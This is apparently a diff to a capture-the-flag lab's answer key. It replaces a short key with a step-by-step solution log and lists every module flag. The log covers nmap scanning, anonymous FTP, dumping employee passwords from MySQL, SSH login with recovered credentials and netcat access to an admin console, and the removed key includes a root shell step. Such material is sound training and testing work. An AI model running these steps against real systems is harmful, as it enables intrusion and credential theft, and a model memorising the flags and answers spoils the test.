@@ -1,95 +1,85 @@
-============================================================
-NETWORK RECONNAISSANCE LAB - ANSWER KEY
-============================================================
-
-==========================
-MODULE 1 - Basic Network Scan
-==========================
-
-# Objective 1
-nmap 10.10.0.10
-
-# Objective 2
-nmap -sV 10.10.0.10
-
-# Objective 3
-cat recon_notes.txt
-
-Expected Flag:
-FLAG{network_module1_student_xxxxxxxxx}
-
-
-
-==========================
-MODULE 2 - Service Enumeration
-==========================
-
-# Objective 1
-nmap -sV 10.10.0.10
-
-# Objective 2
-nmap -sV -oN scan.txt 10.10.0.10
-
-# Objective 3
-grep FLAG scan.txt
-
-Expected Flag:
-FLAG{network_module2_student_xxxxxxxxx}
-
-
-
-==========================
-MODULE 3 - Hidden Administrative Endpoint
-==========================
-
-# Objective 1
-nmap -sV 10.10.0.10
-
-# Objective 2
-cat recon_notes.txt
-
-# Objective 3
-cat scan.txt
-
-Expected Flag:
-FLAG{network_module3_student_xxxxxxxxx}
-
-
-
-==========================
-MODULE 4 - Local Privilege Discovery
-==========================
-
-# Objective 1
-sudo -l
-
-# Objective 2
-sys-helper --status
-
-# Objective 3
-sys-helper --exec "/bin/sh"
-
-Expected Flag:
-FLAG{network_module4_student_xxxxxxxxx}
-
-
-
-==========================
-MODULE 5 - Capstone
-==========================
-
-# Objective 1
-sudo -l
-
-# Objective 2
-sys-helper --exec "/bin/sh"
-
-# Objective 3
-cat /root/flag.txt
-
-Expected Flag:
-FLAG{cll_module5_recon_student_xxxxxxxxx}
-
-============================================================
-END OF ANSWER KEY
-============================================================
+Network Reconnaissance Track — Solution Log
+==============================================
+Module 1: FTP Service Enumeration & Flag Discovery
+Target: 10.10.0.10
+Objective 1 - Scan target ports using Nmap:
+  nmap -Pn 10.10.0.10
+  (add -p- for a full port scan if the default top-1000 misses something)
+Objective 2 - Connect anonymously to the FTP server on port 21:
+  ftp 10.10.0.10
+  user anonymous
+  [press Enter for blank password]
+Objective 3 - Retrieve the Module 1 flag from /pub/FLAG1_DISCOVERED.txt:
+  cd pub
+  ls
+  get FLAG1_DISCOVERED.txt
+  exit
+  cat FLAG1_DISCOVERED.txt
+FLAG: FLAG{techcorp_lab1_mod1_56_7980d7c9}
+(submitted via the Submit Stage Flag box)
+Module 2: MySQL Database Access & Credential Harvesting
+Target: 10.10.0.10:3306, user "scanner", blank password
+Objective 1 - Connect using --skip-ssl:
+  mysql -h 10.10.0.10 -u scanner --skip-ssl
+  [blank password, just press Enter]
+Objective 2/3 - Browse the DB and pull employees + the admin secret note:
+  SHOW DATABASES;
+  USE techcorp_db;
+  SHOW TABLES;
+  SELECT * FROM employees;
+Notable data recovered:
+  admin / admin123 / role=administrator / secret_note contains the flag
+  jsmith / password1 / employee
+  bjones / techcorp2024 / employee
+  sysadmin / $up3rS3cr3t! / role=sysadmin / secret_note: "Backup account active: use backup user for system access"
+  (sysadmin creds may be needed in a later module)
+FLAG: FLAG{techcorp_lab1_mod2_56_aa2e3be4}
+Module 3: REST API Interaction & Key Retrieval
+Target: internal API on 10.10.0.10:9000
+Objective 1 - Query the config table (already connected to MySQL from Module 2):
+  USE techcorp_db;
+  SELECT * FROM config;
+Config table contents (all useful for later modules too):
+  db_version        = 10.6.23-MariaDB
+  internal_api_url  = http://10.10.0.10:9000
+  internal_api_key  = FLAG{techcorp_lab1_mod3_56_5ac1c43d}   <- Module 3 flag, found directly
+  backup_user       = backup            (SSH-capable account)
+  backup_password   = backup123
+  backup_hint       = check /home/backup/.ssh/config for admin console details (Module 4-5 hint)
+  admin_console_port = 8888             (Module 5 hint)
+  admin_console_hint = check /home/backup/.ssh/id_rsa.notes for password hint
+  tls_ssl_note      = MySQL requires TLS disabled for client tools (--skip-ssl) - already knew this
+Objective 2/3 - Hit the REST API on port 9000:
+  exit
+  curl http://10.10.0.10:9000/
+  -> lists endpoints: /status, /employees, /services, /debug
+  -> note says "/debug endpoint contains sensitive information (intentional for testing)"
+FLAG: FLAG{techcorp_lab1_mod3_56_5ac1c43d}
+Module 4: SSH System Access & Privilege Auditing
+Credentials: backup / backup123
+  ssh backup@10.10.0.10
+  yes            (accept host key)
+  backup123      (password)
+  cat /home/backup/.secret_backup_key
+FLAG: FLAG{techcorp_lab1_mod4_56_1fc6c51c}
+Module 5: Admin Console Exploitation (Capstone)
+Target: raw TCP admin console on 10.10.0.10:8888
+Objective 1 - Inspect the SSH config + notes (already SSH'd in as backup):
+  cat /home/backup/.ssh/config
+  cat /home/backup/.ssh/id_rsa.notes
+  -> reveals admin console password: techcorp_admin_2024
+Objective 2/3 - Connect with netcat and authenticate:
+  nc 10.10.0.10 8888
+  HELP                    (lists: HELP, STATUS, FLAG, AUTH, QUIT)
+  AUTH                    (type just "AUTH" with no arguments)
+  [prompted separately] Enter admin password: techcorp_admin_2024
+  FLAG
+RESULT: LAB COMPLETED - all 5 modules, 2350 total pts, 100% accuracy
+================================================================================
+FULL FLAG SUMMARY (Network Reconnaissance Track)
+================================================================================
+Module 1: FLAG{techcorp_lab1_mod1_56_7980d7c9}
+Module 2: FLAG{techcorp_lab1_mod2_56_aa2e3be4}
+Module 3: FLAG{techcorp_lab1_mod3_56_5ac1c43d}
+Module 4: FLAG{techcorp_lab1_mod4_56_1fc6c51c}
+Module 5: (capstone flag from the FLAG command above)
